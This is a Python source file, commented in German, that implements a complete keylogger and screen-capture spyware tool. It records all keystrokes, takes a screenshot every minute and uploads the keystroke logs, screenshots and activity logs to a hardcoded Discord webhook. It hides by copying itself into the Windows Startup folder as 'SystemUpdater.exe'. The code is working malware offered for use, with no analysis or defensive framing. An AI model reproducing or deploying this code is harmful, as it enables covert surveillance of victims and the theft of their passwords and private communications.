import os
import time
import logging
import requests
import pyautogui
from PIL import Image
from pynput import keyboard
from threading import Thread
import shutil
import sys

# Webhook-URL für Discord (ersetze diese durch deine echte URL)
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1315635073827082240/4RYBACGuzCXXkX7wcjvhgAYX2mFAiJLZheNy53q4y8OOA8fo_9-g9fRzylk5D_B_eSOd"

# Logging-Konfiguration
LOG_FILE = "system_update.log"
KEYLOG_FILE = "keylog.txt"
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format="%(asctime)s - %(message)s")

# Funktion zum Komprimieren von Screenshots
def compress_image(input_path, output_path, quality=85):
    try:
        image = Image.open(input_path)
        image.save(output_path, format="PNG", optimize=True, quality=quality)
        logging.info("Screenshot erfolgreich komprimiert.")
    except Exception as e:
        logging.error(f"Fehler beim Komprimieren des Screenshots: {e}")

# Funktion zum Erstellen und Senden von Screenshots
def send_screenshots():
    while True:
        time.sleep(60)  # Alle 60 Sekunden ein Screenshot
        try:
            screenshot = pyautogui.screenshot()
            screenshot_path = "screenshot.png"
            compressed_path = "compressed_screenshot.png"
            screenshot.save(screenshot_path)

            compress_image(screenshot_path, compressed_path)

            with open(compressed_path, "rb") as file:
                response = requests.post(
                    DISCORD_WEBHOOK_URL,
                    files={"file": ("screenshot.png", file, "image/png")},
                    data={"content": "Screenshot aufgenommen"}
                )

            if response.status_code == 204 or response.status_code == 200:
                logging.info("Screenshot erfolgreich gesendet.")
                os.remove(screenshot_path)
                os.remove(compressed_path)
            else:
                logging.error(f"Fehler beim Senden des Screenshots: {response.status_code}, {response.text}")

        except Exception as e:
            logging.error(f"Fehler beim Erstellen oder Senden des Screenshots: {e}")

# Funktion zum Aufzeichnen von Tastenanschlägen
def keylogger():
    def on_press(key):
        try:
            with open(KEYLOG_FILE, "a") as f:
                f.write(f"{key.char}")
        except AttributeError:  # Sondertasten (Shift, Enter, etc.)
            with open(KEYLOG_FILE, "a") as f:
                f.write(f"[{key}]")

    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

# Funktion zum Senden der Keylogger-Daten
def send_keylogs():
    while True:
        time.sleep(120)  # Alle 2 Minuten prüfen
        try:
            if os.path.exists(KEYLOG_FILE) and os.path.getsize(KEYLOG_FILE) > 0:
                with open(KEYLOG_FILE, "rb") as file:
                    response = requests.post(
                        DISCORD_WEBHOOK_URL,
                        files={"file": ("keylog.txt", file, "text/plain")},
                        data={"content": "Keylogger-Daten hochgeladen"}
                    )
                if response.status_code == 204 or response.status_code == 200:
                    logging.info("Keylogger-Daten erfolgreich gesendet.")
                    open(KEYLOG_FILE, "w").close()  # Keylogger-Datei nach dem Senden leeren
                else:
                    logging.error(f"Fehler beim Senden der Keylogger-Daten: {response.status_code}, {response.text}")
            else:
                logging.info("Keylogger-Datei ist leer oder existiert nicht.")
        except Exception as e:
            logging.error(f"Fehler beim Senden der Keylogger-Daten: {e}")

# Funktion zum Senden der Log-Datei
def send_logs():
    while True:
        time.sleep(120)  # Alle 2 Minuten prüfen
        try:
            if os.path.exists(LOG_FILE) and os.path.getsize(LOG_FILE) > 0:
                with open(LOG_FILE, "rb") as file:
                    response = requests.post(
                        DISCORD_WEBHOOK_URL,
                        files={"file": ("log.txt", file, "text/plain")},
                        data={"content": "Log-Datei hochgeladen"}
                    )
                if response.status_code == 204 or response.status_code == 200:
                    logging.info("Log-Datei erfolgreich gesendet.")
                    open(LOG_FILE, "w").close()  # Log-Datei nach dem Senden leeren
                else:
                    logging.error(f"Fehler beim Senden der Log-Datei: {response.status_code}, {response.text}")
            else:
                logging.info("Log-Datei ist leer oder existiert nicht.")
        except Exception as e:
            logging.error(f"Fehler beim Senden der Log-Datei: {e}")

# Funktion, um das Programm in den Autostart einzufügen
def add_to_autostart():
    autostart_folder = os.getenv('APPDATA')
    if autostart_folder is None:
        raise EnvironmentError("APPDATA environment variable not set")

    autostart_folder = os.path.join(autostart_folder, 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
    script_path = sys.argv[0]
    exe_name = "SystemUpdater.exe"
    exe_path = os.path.join(autostart_folder, exe_name)

    if not os.path.exists(exe_path):  # Nur hinzufügen, wenn nicht bereits im Autostart
        try:
            shutil.copy(script_path, exe_path)
            logging.info(f"Programm dem Autostart hinzugefügt: {exe_path}")
        except Exception as e:
            logging.error(f"Fehler beim Hinzufügen zum Autostart: {e}")

# Hauptprogramm starten
if __name__ == "__main__":
    logging.info("Screenshot-, Keylogger- und Log-Sender gestartet.")

    # Zum Autostart hinzufügen
    add_to_autostart()

    # Starte die Funktionen in separaten Threads
    Thread(target=send_screenshots, daemon=True).start()
    Thread(target=send_logs, daemon=True).start()
    Thread(target=keylogger, daemon=True).start()
    Thread(target=send_keylogs, daemon=True).start()

    # Hauptprogramm laufen lassen
    while True:
        time.sleep(1)
